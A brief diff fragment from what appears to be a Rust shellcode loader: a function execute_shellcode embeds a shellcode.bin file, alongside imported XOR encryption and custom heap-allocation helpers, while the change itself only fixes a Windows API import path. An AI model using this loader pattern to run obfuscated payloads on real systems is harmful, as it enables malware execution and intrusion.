@@ -4,7 +4,7 @@ use std::thread::sleep;
 use std::time::Duration;
 use crate::memory::{asm_heap_create, asm_heap_alloc};
 use crate::utils::xor_encrypt_decrypt;
-use winapi::um::debugapi::GetLastError;
+use winapi::um::errhandlingapi::GetLastError;
 
 pub fn execute_shellcode() {
     let buffer = include_bytes!("..\\shellcode.bin");
